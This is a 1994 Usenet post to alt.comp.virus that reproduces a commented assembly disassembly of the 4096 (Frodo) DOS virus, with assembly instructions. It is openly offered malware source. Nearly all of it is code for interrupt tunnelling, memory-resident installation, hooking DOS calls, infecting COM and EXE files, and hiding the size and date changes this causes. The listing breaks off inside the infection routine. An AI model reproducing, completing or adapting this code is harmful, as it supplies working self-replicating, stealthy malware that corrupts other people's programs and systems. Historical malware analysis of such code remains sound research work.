From netcom.com!ix.netcom.com!howland.reston.ans.net!usc!bloom-beacon.mit.edu!uhog.mit.edu!rutgers!engr.orst.edu!gaia.ucs.orst.edu!myhost.subdomain.domain!clair Tue Nov 29 09:49:56 1994
Xref: netcom.com alt.comp.virus:485
Path: netcom.com!ix.netcom.com!howland.reston.ans.net!usc!bloom-beacon.mit.edu!uhog.mit.edu!rutgers!engr.orst.edu!gaia.ucs.orst.edu!myhost.subdomain.domain!clair
From: clair@myhost.subdomain.domain (The Clairvoyant)
Newsgroups: alt.comp.virus
Subject: Frodo source
Date: 28 Nov 1994 07:47:20 GMT
Organization: String to put in the Organization Header
Lines: 1814
Message-ID: <3bc1u8$mjc@gaia.ucs.orst.edu>
NNTP-Posting-Host: tempest.rhn.orst.edu
X-Newsreader: TIN [version 1.2 PL2]


_4096           segment byte public
                assume  cs:_4096, ds:_4096

; 4096 Virus
; Disassembly done by Dark Angel of Phalcon/Skism for 40Hex Issue #9
; Assemble with TASM; the resultant file size is 4081 bytes

                org     0
startvirus:
                db      0
                jmp     installvirus
oldheader: ; original 1Ch bytes of the carrier file
                retn
                db      75h,02,44h,15h,46h,20h
                db      'Copyright Bourb%}i, I'
endoldheader:
EXEflag         db       00h
                db      0FEh, 3Ah

int1: ; locate the BIOS or DOS entry point for int 13h and int 21h
                push    bp                      ; set up stack frame
                mov     bp,sp
                push    ax
                cmp     word ptr [bp+4],0C000h  ; in BIOS?
                jnb     foundorigint            ; nope, haven't found it
                mov     ax,cs:DOSsegment        ; in DOS?
                cmp     [bp+4],ax
                jbe     foundorigint
exitint1:
                pop     ax
                pop     bp
                iret
foundorigint:
                cmp     byte ptr cs:tracemode,1
                jz      tracemode1
                mov     ax,[bp+4]               ; save segment of entry point
                mov     word ptr cs:origints+2,ax
                mov     ax,[bp+2]               ; save offset of entry point
                mov     word ptr cs:origints,ax
                jb      finishint1
                pop     ax
                pop     bp
                mov     ss,cs:savess            ; restore the stack to its
                mov     sp,cs:savesp            ; original state
                mov     al,cs:saveIMR           ; Restore IMR
                out     21h,al                  ; (enable interrupts)
                jmp     setvirusints
finishint1:
                and     word ptr [bp+6],0FEFFh  ; turn off trap flag
                mov     al,cs:saveIMR           ; and restore IMR
                out     21h,al
                jmp     short exitint1
tracemode1:
                dec     byte ptr cs:instructionstotrace
                jnz     exitint1
                and     word ptr [bp+6],0FEFFh  ; turn off trap flag
                call    saveregs
                call    swapvirint21            ; restore original int
                lds     dx,dword ptr cs:oldint1 ; 21h & int 1 handlers
                mov     al,1
                call    setvect
                call    restoreregs
                jmp     short finishint1

getint:
                push    ds
                push    si
                xor     si,si                   ; clear si
                mov     ds,si                   ; ds->interrupt table
                xor     ah,ah                   ; cbw would be better!?
                mov     si,ax
                shl     si,1                    ; convert int # to offset in
                shl     si,1                    ; interrupt table (int # x 4)
                mov     bx,[si]                 ; es:bx = interrupt vector
                mov     es,[si+2]               ; get old interrupt vector
                                                ; save 3 bytes if use les bx,[si]
                pop     si
                pop     ds
                retn

installvirus:
                mov     word ptr cs:stackptr,offset topstack
                mov     cs:initialax,ax         ; save initial value for ax
                mov     ah,30h                  ; Get DOS version
                int     21h

                mov     cs:DOSversion,al        ; Save DOS version
                mov     cs:carrierPSP,ds        ; Save PSP segment
                mov     ah,52h                  ; Get list of lists
                int     21h

                mov     ax,es:[bx-2]            ; segment of first MCB
                mov     cs:DOSsegment,ax        ; save it for use in int 1
                mov     es,ax                   ; es = segment first MCB
                mov     ax,es:[1]               ; Get owner of first MCB
                mov     cs:ownerfirstMCB,ax     ; save it
                push    cs
                pop     ds
                mov     al,1                    ; get single step vector
                call    getint
                mov     word ptr ds:oldint1,bx  ; save it for later
                mov     word ptr ds:oldint1+2,es; restoration
                mov     al,21h                  ; get int 21h vector
                call    getint
                mov     word ptr ds:origints,bx
                mov     word ptr ds:origints+2,es
                mov     byte ptr ds:tracemode,0 ; regular trace mode on
                mov     dx,offset int1          ; set new int 1 handler
                mov     al,1
                call    setvect
                pushf
                pop     ax
                or      ax,100h                 ; turn on trap flag
                push    ax
                in      al,21h                  ; Get old IMR
                mov     ds:saveIMR,al
                mov     al,0FFh                 ; disable all interrupts
                out     21h,al
                popf
                mov     ah,52h                  ; Get list of lists
                pushf                           ; (for tracing purposes)
                call    dword ptr ds:origints   ; perform the tunnelling
                pushf
                pop     ax
                and     ax,0FEFFh               ; turn off trap flag
                push    ax
                popf
                mov     al,ds:saveIMR           ; reenable interrupts
                out     21h,al
                push    ds
                lds     dx,dword ptr ds:oldint1
                mov     al,1                    ; restore int 1 to the
                call    setvect                 ; original handler
                pop     ds
                les     di,dword ptr ds:origints; set up int 21h handlers
                mov     word ptr ds:oldint21,di
                mov     word ptr ds:oldint21+2,es
                mov     byte ptr ds:jmpfarptr,0EAh ; jmp far ptr
                mov     word ptr ds:int21store,offset otherint21
                mov     word ptr ds:int21store+2,cs
                call    swapvirint21            ; activate virus in memory
                mov     ax,4B00h
                mov     ds:checkres,ah          ; set resident flag to a
                                                ; dummy value
                mov     dx,offset EXEflag+1     ; save EXE flag
                push    word ptr ds:EXEflag
                int     21h                     ; installation check
                                                ; returns checkres=0 if
                                                ; installed

                pop     word ptr ds:EXEflag     ; restore EXE flag
                add     word ptr es:[di-4],9
                nop                             ; !?
                mov     es,ds:carrierPSP        ; restore ES and DS to their
                mov     ds,ds:carrierPSP        ; original values
                sub     word ptr ds:[2],(topstack/10h)+1
                                                ; alter top of memory in PSP
                mov     bp,ds:[2]               ; get segment
                mov     dx,ds
                sub     bp,dx
                mov     ah,4Ah                  ; Find total available memory
                mov     bx,0FFFFh
                int     21h

                mov     ah,4Ah                  ; Allocate all available memory
                int     21h

                dec     dx                      ; go to MCB of virus memory
                mov     ds,dx
                cmp     byte ptr ds:[0],'Z'     ; is it the last block?
                je      carrierislastMCB
                dec     byte ptr cs:checkres    ; mark need to install virus
carrierislastMCB:
                cmp     byte ptr cs:checkres,0  ; need to install?
                je      playwithMCBs            ; nope, go play with MCBs
                mov     byte ptr ds:[0],'M'     ; mark not end of chain
playwithMCBs:
                mov     ax,ds:[3]               ; get memory size controlled
                mov     bx,ax                   ; by the MCB
                sub     ax,(topstack/10h)+1     ; calculate new size
                add     dx,ax                   ; find high memory segment
                mov     ds:[3],ax               ; put new size in MCB
                inc     dx                      ; one more for the MCB
                mov     es,dx                   ; es->high memory MCB
                mov     byte ptr es:[0],'Z'     ; mark end of chain
                push    word ptr cs:ownerfirstMCB ; get DOS PSP ID
                pop     word ptr es:[1]         ; make it the owner
                mov     word ptr es:[3],160h    ; fill in the size field
                inc     dx
                mov     es,dx                   ; es->high memory area
                push    cs
                pop     ds
                mov     cx,(topstack/2)         ; zopy 0-1600h to high memory
                mov     si,offset topstack-2
                mov     di,si
                std                             ; zopy backwards
                rep     movsw
                cld
                push    es                      ; set up stack for jmp into
                mov     ax,offset highentry     ; virus code in high memory
                push    ax
                mov     es,cs:carrierPSP        ; save current PSP segment
                mov     ah,4Ah                  ; Alter memory allocation
                mov     bx,bp                   ; bx = paragraphs
                int     21h
                retf                            ; jmp to virus code in high
highentry:                                      ; memory
                call    swapvirint21
                mov     word ptr cs:int21store+2,cs
                call    swapvirint21
                push    cs
                pop     ds
                mov     byte ptr ds:handlesleft,14h ; reset free handles count
                push    cs
                pop     es
                mov     di,offset handletable
                mov     cx,14h
                xor     ax,ax                   ; clear handle table
                rep     stosw
                mov     ds:hideclustercountchange,al ; clear the flag
                mov     ax,ds:carrierPSP
                mov     es,ax                   ; es->PSP
                lds     dx,dword ptr es:[0Ah]   ; get terminate vector (why?)
                mov     ds,ax                   ; ds->PSP
                add     ax,10h                  ; adjust for PSP
                add     word ptr cs:oldheader+16h,ax ; adjust jmp location
                cmp     byte ptr cs:EXEflag,0   ; for PSP
                jne     returntoEXE
returntoCOM:
                sti
                mov     ax,word ptr cs:oldheader; restore first 6 bytes of the
                mov     ds:[100h],ax            ; COM file
                mov     ax,word ptr cs:oldheader+2
                mov     ds:[102h],ax
                mov     ax,word ptr cs:oldheader+4
                mov     ds:[104h],ax
                push    word ptr cs:carrierPSP  ; Segment of carrier file's
                mov     ax,100h                 ; PSP
                push    ax
                mov     ax,cs:initialax         ; restore orig. value of ax
                retf                            ; return to original COM file

returntoEXE:
                add     word ptr cs:oldheader+0eh,ax
                mov     ax,cs:initialax         ; Restore ax
                mov     ss,word ptr cs:oldheader+0eh ; Restore stack to
                mov     sp,word ptr cs:oldheader+10h ; original value
                sti
                jmp     dword ptr cs:oldheader+14h ; jmp to original cs:IP
                                                ; entry point
entervirus:
                cmp     sp,100h                 ; COM file?
                ja      dont_resetstack         ; if so, skip this
                xor     sp,sp                   ; new stack
dont_resetstack:
                mov     bp,ax
                call    next                    ; calculate relativeness
next:
                pop     cx
                sub     cx,offset next          ; cx = delta offset
                mov     ax,cs                   ; ax = segment
                mov     bx,10h                  ; convert to offset
                mul     bx
                add     ax,cx
                adc     dx,0
                div     bx                      ; convert to seg:off
                push    ax                      ; set up stack for jmp
                mov     ax,offset installvirus  ; to installvirus
                push    ax
                mov     ax,bp
                retf                            ; go to installvirus

int21commands:
                db      30h     ; get DOS version
                dw      offset getDOSversion
                db      23h     ; FCB get file size
                dw      offset FCBgetfilesize
                db      37h     ; get device info
                dw      offset get_device_info
                db      4Bh     ; execute
                dw      offset execute
                db      3Ch     ; create file w/ handle
                dw      offset createhandle
                db      3Dh     ; open file
                dw      offset openhandle
                db      3Eh     ; close file
                dw      offset handleclosefile
                db      0Fh     ; FCB open file
                dw      offset FCBopenfile
                db      14h     ; sequential FCB read
                dw      offset sequentialFCBread
                db      21h     ; random FCB read
                dw      offset randomFCBread
                db      27h     ; random FCB block read
                dw      offset randomFCBblockread
                db      11h     ; FCB find first
                dw      offset FCBfindfirstnext
                db      12h     ; FCB find next
                dw      offset FCBfindfirstnext
                db      4Eh     ; filename find first
                dw      offset filenamefindfirstnext
                db      4Fh     ; filename find next
                dw      offset filenamefindfirstnext
                db      3Fh     ; read
                dw      offset handleread
                db      40h     ; write
                dw      offset handlewrite
                db      42h     ; move file pointer
                dw      offset handlemovefilepointer
                db      57h     ; get/set file time/date
                dw      offset getsetfiletimedate
                db      48h     ; allocate memory
                dw      offset allocatememory
endcommands:

otherint21:
                cmp     ax,4B00h                ; execute?
                jnz     notexecute
                mov     cs:checkres,al          ; clear the resident flag
notexecute:
                push    bp                      ; set up stack frame
                mov     bp,sp
                push    [bp+6]                  ; push old flags
                pop     cs:int21flags           ; and put in variable
                pop     bp                      ; why?
                push    bp                      ; why?
                mov     bp,sp                   ; set up new stack frame
                call    saveregs
                call    swapvirint21            ; reenable DOS int 21h handler
                call    disableBREAK
                call    restoreregs
                call    _pushall
                push    bx
                mov     bx,offset int21commands ; bx->command table
scanforcommand:
                cmp     ah,cs:[bx]              ; scan for the function
                jne     findnextcommand         ; code/subroutine combination
                mov     bx,cs:[bx+1]
                xchg    bx,[bp-14h]
                cld
                retn
findnextcommand:
                add     bx,3                    ; go to next command
                cmp     bx,offset endcommands   ; in the table until
                jb      scanforcommand          ; there are no more
                pop     bx
exitotherint21:
                call    restoreBREAK
                in      al,21h                  ; save IMR
                mov     cs:saveIMR,al
                mov     al,0FFh                 ; disable all interrupts
                out     21h,al
                mov     byte ptr cs:instructionstotrace,4 ; trace into
                mov     byte ptr cs:tracemode,1           ; oldint21
                call    replaceint1             ; set virus int 1 handler
                call    _popall
                push    ax
                mov     ax,cs:int21flags        ; get the flags
                or      ax,100h                 ; turn on the trap flag
                push    ax                      ; and set it in motion
                popf
                pop     ax
                pop     bp
                jmp     dword ptr cs:oldint21   ; chain back to original int
                                                ; 21h handler -- do not return

exitint21:
                call    saveregs
                call    restoreBREAK
                call    swapvirint21
                call    restoreregs
                pop     bp
                push    bp                      ; set up stack frame
                mov     bp,sp
                push    word ptr cs:int21flags  ; get the flags and put
                pop     word ptr [bp+6]         ; them on the stack for
                pop     bp                      ; the iret
                iret

FCBfindfirstnext:
                call    _popall
                call    callint21
                or      al,al                   ; Found any files?
                jnz     exitint21               ; guess not
                call    _pushall
                call    getdisktransferaddress
                mov     al,0
                cmp     byte ptr [bx],0FFh      ; Extended FCB?
                jne     findfirstnextnoextendedFCB
                mov     al,[bx+6]
                add     bx,7                    ; convert to normal FCB
findfirstnextnoextendedFCB:
                and     cs:hide_size,al
                test    byte ptr [bx+1Ah],80h   ; check year bit for virus
                jz      _popall_then_exitint21  ; infection tag. exit if so
                sub     byte ptr [bx+1Ah],0C8h  ; alter file date
                cmp     byte ptr cs:hide_size,0
                jne     _popall_then_exitint21
                sub     word ptr [bx+1Dh],1000h ; hide file size
                sbb     word ptr [bx+1Fh],0
_popall_then_exitint21:
                call    _popall
                jmp     short exitint21

FCBopenfile:
                call    _popall
                call    callint21               ; chain to original int 21h
                call    _pushall
                or      al,al                   ; 0 = success
                jnz     _popall_then_exitint21
                mov     bx,dx
                test    byte ptr [bx+15h],80h   ; check if infected yet
                jz      _popall_then_exitint21
                sub     byte ptr [bx+15h],0C8h  ; restore date
                sub     word ptr [bx+10h],1000h ; and hide file size
                sbb     byte ptr [bx+12h],0
                jmp     short _popall_then_exitint21

randomFCBblockread:
                jcxz    go_exitotherint21       ; reading any blocks?

randomFCBread:
                mov     bx,dx
                mov     si,[bx+21h]             ; check if reading first
                or      si,[bx+23h]             ; bytes
                jnz     go_exitotherint21
                jmp     short continueFCBread

sequentialFCBread:
                mov     bx,dx
                mov     ax,[bx+0Ch]             ; check if reading first
                or      al,[bx+20h]             ; bytes
                jnz     go_exitotherint21
continueFCBread:
                call    checkFCBokinfect
                jnc     continuecontinueFCBread
go_exitotherint21:
                jmp     exitotherint21
continuecontinueFCBread:
                call    _popall
                call    _pushall
                call    callint21               ; chain to original handler
                mov     [bp-4],ax               ; set the return codes
                mov     [bp-8],cx               ; properly
                push    ds                      ; save FCB pointer
                push    dx
                call    getdisktransferaddress
                cmp     word ptr [bx+14h],1     ; check for EXE infection
                je      FCBreadinfectedfile     ; (IP = 1)
                mov     ax,[bx]                 ; check for COM infection
                add     ax,[bx+2]               ; (checksum = 0)
                add     ax,[bx+4]
                jz      FCBreadinfectedfile
                add     sp,4                    ; no infection, no stealth
                jmp     short _popall_then_exitint21 ; needed
FCBreadinfectedfile:
                pop     dx                      ; restore address of the FCB
                pop     ds
                mov     si,dx
                push    cs
                pop     es
                mov     di,offset tempFCB       ; copy FCB to temporary one
                mov     cx,25h
                rep     movsb
                mov     di,offset tempFCB
                push    cs
                pop     ds
                mov     ax,[di+10h]             ; get old file size
                mov     dx,[di+12h]
                add     ax,100Fh                ; increase by virus size
                adc     dx,0                    ; and round to the nearest
                and     ax,0FFF0h               ; paragraph
                mov     [di+10h],ax             ; insert new file size
                mov     [di+12h],dx
                sub     ax,0FFCh
                sbb     dx,0
                mov     [di+21h],ax             ; set new random record #
                mov     [di+23h],dx
                mov     word ptr [di+0Eh],1     ; record size = 1
                mov     cx,1Ch
                mov     dx,di
                mov     ah,27h                  ; random block read 1Ch bytes
                call    callint21
                jmp     _popall_then_exitint21

FCBgetfilesize:
                push    cs
                pop     es
                mov     si,dx
                mov     di,offset tempFCB       ; copy FCB to temp buffer
                mov     cx,0025h
                repz    movsb
                push    ds
                push    dx
                push    cs
                pop     ds
                mov     dx,offset tempFCB
                mov     ah,0Fh                  ; FCB open file
                call    callint21
                mov     ah,10h                  ; FCB close file
                call    callint21
                test    byte ptr [tempFCB+15h],80h ; check date bit
                pop     si
                pop     ds
                jz      will_exitotherint21     ; exit if not infected
                les     bx,dword ptr cs:[tempFCB+10h] ; get filesize
                mov     ax,es
                sub     bx,1000h                ; hide increase
                sbb     ax,0
                xor     dx,dx
                mov     cx,word ptr cs:[tempFCB+0eh] ; get record size
                dec     cx
                add     bx,cx
                adc     ax,0
                inc     cx
                div     cx
                mov     [si+23h],ax             ; fix random access record #
                xchg    dx,ax
                xchg    bx,ax
                div     cx
                mov     [si+21h],ax             ; fix random access record #
                jmp     _popall_then_exitint21

filenamefindfirstnext:
                and     word ptr cs:int21flags,-2 ; turn off trap flag
                call    _popall
                call    callint21
                call    _pushall
                jnb     filenamefffnOK          ; continue if a file is found
                or      word ptr cs:int21flags,1
                jmp     _popall_then_exitint21

filenamefffnOK:
                call    getdisktransferaddress
                test    byte ptr [bx+19h],80h   ; Check high bit of date
                jnz     filenamefffnfileinfected; Bit set if infected
                jmp     _popall_then_exitint21
filenamefffnfileinfected:
                sub     word ptr [bx+1Ah],1000h ; hide file length increase
                sbb     word ptr [bx+1Ch],0
                sub     byte ptr [bx+19h],0C8h  ; and date change
                jmp     _popall_then_exitint21

createhandle:
                push    cx
                and     cx,7                    ; mask the attributes
                cmp     cx,7                    ; r/o, hidden, & system?
                je      exit_create_handle
                pop     cx
                call    replaceint13and24
                call    callint21               ; chain to original int 21h
                call    restoreint13and24
                pushf
                cmp     byte ptr cs:errorflag,0 ; check if any errors yet
                je      no_errors_createhandle
                popf
will_exitotherint21:
                jmp     exitotherint21
no_errors_createhandle:
                popf
                jc      other_error_createhandle; exit on error
                mov     bx,ax                   ; move handle to bx
                mov     ah,3Eh                  ; Close file
                call    callint21
                jmp     short openhandle
other_error_createhandle:
                or      byte ptr cs:int21flags,1; turn on the trap flag
                mov     [bp-4],ax               ; set the return code properly
                jmp     _popall_then_exitint21
exit_create_handle:
                pop     cx
                jmp     exitotherint21

openhandle:
                call    getcurrentPSP
                call    checkdsdxokinfect
                jc      jmp_exitotherint21
                cmp     byte ptr cs:handlesleft,0 ; make sure there is a free
                je      jmp_exitotherint21        ; entry in the table
                call    setup_infection         ; open the file
                cmp     bx,0FFFFh               ; error?
                je      jmp_exitotherint21      ; if so, exit
                dec     byte ptr cs:handlesleft
                push    cs
                pop     es
                mov     di,offset handletable
                mov     cx,14h
                xor     ax,ax                   ; find end of the table
                repne   scasw
                mov     ax,cs:currentPSP        ; put the PSP value and the
                mov     es:[di-2],ax            ; handle # in the table
                mov     es:[di+26h],bx
                mov     [bp-4],bx               ; put handle # in return code
handleopenclose_exit:
                and     byte ptr cs:int21flags,0FEh ; turn off the trap flag
                jmp     _popall_then_exitint21
jmp_exitotherint21:
                jmp     exitotherint21

handleclosefile:
                push    cs
                pop     es
                call    getcurrentPSP
                mov     di,offset handletable
                mov     cx,14h                  ; 14h entries max
                mov     ax,cs:currentPSP        ; search for calling PSP
scanhandle_close:
                repne   scasw
                jnz     handlenotfound          ; handle not trapped
                cmp     bx,es:[di+26h]          ; does the handle correspond?
                jne     scanhandle_close        ; if not, find another handle
                mov     word ptr es:[di-2],0    ; otherwise, clear handle
                call    infect_file
                inc     byte ptr cs:handlesleft ; fix handles left counter
                jmp     short handleopenclose_exit ; and exit
handlenotfound:
                jmp     exitotherint21

getdisktransferaddress:
                push    es
                mov     ah,2Fh                  ; Get disk transfer address
                call    callint21               ; to es:bx
                push    es
                pop     ds                      ; mov to ds:bx
                pop     es
                retn
execute:
                or      al,al                   ; load and execute?
                jz      loadexecute             ; yepper!
                jmp     checkloadnoexecute      ; otherwise check if
                                                ; load/no execute
loadexecute:
                push    ds                      ; save filename
                push    dx
                mov     word ptr cs:parmblock,bx; save parameter block and
                mov     word ptr cs:parmblock+2,es; move to ds:si
                lds     si,dword ptr cs:parmblock
                mov     di,offset copyparmblock ; copy the parameter block
                mov     cx,0Eh
                push    cs
                pop     es
                rep     movsb
                pop     si                      ; copy the filename
                pop     ds                      ; to the buffer
                mov     di,offset copyfilename
                mov     cx,50h
                rep     movsb
                mov     bx,0FFFFh
                call    allocate_memory         ; allocate available memory
                call    _popall
                pop     bp                      ; save the parameters
                pop     word ptr cs:saveoffset  ; on the stack
                pop     word ptr cs:savesegment
                pop     word ptr cs:int21flags
                mov     ax,4B01h                ; load/no execute
                push    cs                      ; ds:dx -> file name
                pop     es                      ; es:bx -> parameter block
                mov     bx,offset copyparmblock
                pushf                           ; perform interrupt 21h
                call    dword ptr cs:oldint21
                jnc     continue_loadexecute    ; continue if no error
                or      word ptr cs:int21flags,1; turn on trap flag
                push    word ptr cs:int21flags  ; if error
                push    word ptr cs:savesegment ; restore stack
                push    word ptr cs:saveoffset
                push    bp                      ; restore the stack frame
                mov     bp,sp                   ; and restore ES:BX to
                les     bx,dword ptr cs:parmblock ; point to the parameter
                jmp     exitint21               ; block
continue_loadexecute:
                call    getcurrentPSP
                push    cs
                pop     es
                mov     di,offset handletable   ; scan the handle table
                mov     cx,14h                  ; for the current PSP's
scanhandle_loadexecute:                         ; handles
                mov     ax,cs:currentPSP
                repne   scasw
                jnz     loadexecute_checkEXE
                mov     word ptr es:[di-2],0    ; clear entry in handle table
                inc     byte ptr cs:handlesleft ; fix handlesleft counter
                jmp     short scanhandle_loadexecute
loadexecute_checkEXE:
                lds     si,dword ptr cs:origcsip
                cmp     si,1                    ; Check if EXE infected
                jne     loadexecute_checkCOM
                mov     dx,word ptr ds:oldheader+16h ; get initial CS
                add     dx,10h                  ; adjust for PSP
                mov     ah,51h                  ; Get current PSP segment
                call    callint21
                add     dx,bx                   ;adjust for start load segment
                mov     word ptr cs:origcsip+2,dx
                push    word ptr ds:oldheader+14h       ; save old IP
                pop     word ptr cs:origcsip
                add     bx,10h                          ; adjust for the PSP
                add     bx,word ptr ds:oldheader+0Eh    ; add old SS
                mov     cs:origss,bx
                push    word ptr ds:oldheader+10h       ; old SP
                pop     word ptr cs:origsp
                jmp     short perform_loadexecute
loadexecute_checkCOM:
                mov     ax,[si]                 ; Check if COM infected
                add     ax,[si+2]
                add     ax,[si+4]
                jz      loadexecute_doCOM       ; exit if already infected
                push    cs                      ; otherwise check to see
                pop     ds                      ; if it is suitable for
                mov     dx,offset copyfilename  ; infection
                call    checkdsdxokinfect
                call    setup_infection
                inc     byte ptr cs:hideclustercountchange
                call    infect_file             ; infect the file
                dec     byte ptr cs:hideclustercountchange
perform_loadexecute:
                mov     ah,51h                  ; Get current PSP segment
                call    callint21
                call    saveregs
                call    restoreBREAK
                call    swapvirint21
                call    restoreregs
                mov     ds,bx                   ; ds = current PSP segment
                mov     es,bx                   ; es = current PSP segment
                push    word ptr cs:int21flags  ; restore stack parameters
                push    word ptr cs:savesegment
                push    word ptr cs:saveoffset
                pop     word ptr ds:[0Ah]       ; Set terminate address in PSP
                pop     word ptr ds:[0Ch]       ; to return address found on
                                                ; the stack
                                                ; (int 21h caller CS:IP)
                push    ds
                lds     dx,dword ptr ds:[0Ah]   ; Get terminate address in PSP
                mov     al,22h                  ; Set terminate address to it
                call    setvect
                pop     ds
                popf
                pop     ax
                mov     ss,cs:origss            ; restore the stack
                mov     sp,cs:origsp            ; and
                jmp     dword ptr cs:origcsip   ; perform the execute

loadexecute_doCOM:
                mov     bx,[si+1]               ; restore original COM file
                mov     ax,word ptr ds:[bx+si-261h]
                mov     [si],ax
                mov     ax,word ptr ds:[bx+si-25Fh]
                mov     [si+2],ax
                mov     ax,word ptr ds:[bx+si-25Dh]
                mov     [si+4],ax
                jmp     short perform_loadexecute
checkloadnoexecute:
                cmp     al,1
                je      loadnoexecute
                jmp     exitotherint21
loadnoexecute:
                or      word ptr cs:int21flags,1; turn on trap flag
                mov     word ptr cs:parmblock,bx; save pointer to parameter
                mov     word ptr cs:parmblock+2,es ; block
                call    _popall
                call    callint21               ; chain to int 21h
                call    _pushall
                les     bx,dword ptr cs:parmblock ; restore pointer to
                                                ; parameter block
                lds     si,dword ptr es:[bx+12h]; get cs:ip on execute return
                jc      exit_loadnoexecute
                and     byte ptr cs:int21flags,0FEh ; turn off trap flag
                cmp     si,1                    ; check for EXE infection
                je      loadnoexecute_EXE_already_infected
                                                ; infected if initial IP = 1
                mov     ax,[si]                 ; check for COM infection
                add     ax,[si+2]               ; infected if checksum = 0
                add     ax,[si+4]
                jnz     perform_the_execute
                mov     bx,[si+1]               ; get jmp location
                mov     ax,ds:[bx+si-261h]      ; restore original COM file
                mov     [si],ax
                mov     ax,ds:[bx+si-25Fh]
                mov     [si+2],ax
                mov     ax,ds:[bx+si-25Dh]
                mov     [si+4],ax
                jmp     short perform_the_execute
loadnoexecute_EXE_already_infected:
                mov     dx,word ptr ds:oldheader+16h ; get entry CS:IP
                call    getcurrentPSP
                mov     cx,cs:currentPSP
                add     cx,10h                  ; adjust for PSP
                add     dx,cx
                mov     es:[bx+14h],dx          ; alter the entry point CS
                mov     ax,word ptr ds:oldheader+14h
                mov     es:[bx+12h],ax
                mov     ax,word ptr ds:oldheader+0Eh ; alter stack
                add     ax,cx
                mov     es:[bx+10h],ax
                mov     ax,word ptr ds:oldheader+10h
                mov     es:[bx+0Eh],ax
perform_the_execute:
                call    getcurrentPSP
                mov     ds,cs:currentPSP
                mov     ax,[bp+2]               ; restore length as held in
                mov     word ptr ds:oldheader+6,ax
                mov     ax,[bp+4]               ; the EXE header
                mov     word ptr ds:oldheader+8,ax
exit_loadnoexecute:
                jmp     _popall_then_exitint21

getDOSversion:
                mov     byte ptr cs:hide_size,0
                mov     ah,2Ah                  ; Get date
                call    callint21
                cmp     dx,916h                 ; September 22?
                jb      exitDOSversion          ; leave if not
                call    writebootblock          ; this is broken
exitDOSversion:
                jmp     exitotherint21

infect_file:
                call    replaceint13and24
                call    findnextparagraphboundary
                mov     byte ptr ds:EXEflag,1   ; assume is an EXE file
                cmp     word ptr ds:readbuffer,'ZM' ; check here for regular
                je      clearlyisanEXE              ; EXE header
                cmp     word ptr ds:readbuffer,'MZ' ; check here for alternate
                je      clearlyisanEXE              ; EXE header
                dec     byte ptr ds:EXEflag         ; if neither, assume is a
                jz      try_infect_com              ; COM file
clearlyisanEXE:
                mov     ax,ds:lengthinpages     ; get file size in pages
                shl     cx,1                    ; and convert it to
                mul     cx                      ; bytes
                add     ax,200h                 ; add 512 bytes
                cmp     ax,si
                jb      go_exit_infect_file
                mov     ax,ds:minmemory         ; make sure min and max memory
                or      ax,ds:maxmemory         ; are not both zero
                jz      go_exit_infect_file
                mov     ax,ds:filesizelow       ; get filesize in dx:ax
                mov     dx,ds:filesizehigh
                mov     cx,200h                 ; convert to pages
                div     cx
                or      dx,dx                   ; filesize multiple of 512?
                jz      filesizemultiple512     ; then don't increment #
                inc     ax                      ; pages
filesizemultiple512:
                mov     ds:lengthinpages,ax     ; put in new values for length
                mov     ds:lengthMOD512,dx      ; fields
                cmp     word ptr ds:initialIP,1 ; check if already infected
                je      exit_infect_file
                mov     word ptr ds:initialIP,1 ; set new entry point
                mov     ax,si                   ; calculate new entry point
                sub     ax,ds:headersize        ; segment
                mov     ds:initialcs,ax         ; put this in for cs
                add     word ptr ds:lengthinpages,8 ; 4K more
                mov     ds:initialSS,ax         ; put entry segment in for SS
                mov     word ptr ds:initialSP,1000h ; set stack @ 1000h
                call    finish_infection
go_exit_infect_file:
                jmp     short exit_infect_file
try_infect_com:
                cmp     si,0F00h                ; make sure file is under
                jae     exit_infect_file        ; F00h paragraphs or else
                                                ; it will be too large once it
                                                ; is infected
                mov     ax,ds:readbuffer        ; first save first 6 bytes
                mov     word ptr ds:oldheader,ax
                add     dx,ax
                mov     ax,ds:readbuffer+2
                mov     word ptr ds:oldheader+2,ax
                add     dx,ax
                mov     ax,ds:readbuffer+4
                mov     word ptr ds:oldheader+4,ax
                add     dx,ax                   ; exit if checksum = 0
                jz      exit_infect_file        ; since then it is already
                                                ; infected
                mov     cl,0E9h                 ; encode jmp instruction
                mov     byte ptr ds:readbuffer,cl
                mov     ax,10h                  ; find file size
                mul     si
                add     ax,offset entervirus-3  ; calculate offset of jmp
                mov     word ptr ds:readbuffer+1,ax ; encode it
                mov     ax,ds:readbuffer        ; checksum it to 0
                add     ax,ds:readbuffer+2
                neg     ax
                mov     ds:readbuffer+4,ax
                call    finish_infection
exit_infect_file:
                mov     ah,3Eh                  ; Close file
                call    callint21
                call    restoreint13and24
                retn


findnextparagraphboundary:
                push    cs
                pop     ds
                mov     ax,5700h                ; Get file time/date
                call    callint21
                mov     ds:filetime,cx
                mov     ds:filedate,dx
                mov     ax,4200h                ; Go to beginning of file
                xor     cx,cx
                mov     dx,cx
                call    callint21
                mov     ah,3Fh                  ; Read first 1Ch bytes
                mov     cl,1Ch
                mov     dx,offset readbuffer
                call    callint21
                mov     ax,4200h                ; Go to beginning of file
                xor     cx,cx
                mov     dx,cx
                call    callint21
                mov     ah,3Fh                  ; Read first 1Ch bytes
                mov     cl,1Ch
                mov     dx,offset oldheader
                call    callint21
                mov     ax,4202h                ; Go to end of file
                xor     cx,cx
                mov     dx,cx
                call    callint21
                mov     ds:filesizelow,ax       ; save filesize
                mov     ds:filesizehigh,dx
                mov     di,ax
                add     ax,0Fh                  ; round to nearest paragraph
                adc     dx,0                    ; boundary
                and     ax,0FFF0h
                sub     di,ax                   ; di=# bytes to next paragraph
                mov     cx,10h                  ; normalize filesize
                div     cx                      ; to paragraphs
                mov     si,ax                   ; si = result
                retn


finish_infection:
                mov     ax,4200h                ; Go to beginning of file
                xor     cx,cx
                mov     dx,cx
                call    callint21
                mov     ah,40h                  ; Write new header to file
                mov     cl,1Ch
                mov     dx,offset readbuffer
                call    callint21
                mov     ax,10h                  ; convert paragraph boundary
                mul     si                      ; to a byte value
                mov     cx,dx
                mov     dx,ax
                mov     ax,4200h                ; go to first paragraph
                call    callint21               ; boundary at end of file
                xor     dx,dx
                mov     cx,1000h
                add     cx,di
                mov     ah,40h                  ; Concatenate virus to file
                call    callint21
                mov     ax,5701h                ; Restore file time/date
                mov     cx,ds:filetime
                mov     dx,ds:filedate
                test    dh,80h                  ; check for infection bit
                jnz     highbitset
                add     dh,0C8h                 ; alter if not set yet
highbitset:
                call    callint21
                cmp     byte ptr ds:DOSversion,3; if not DOS 3+, then
                jb      exit_finish_infection   ; do not hide the alteration
                                                ; in cluster count
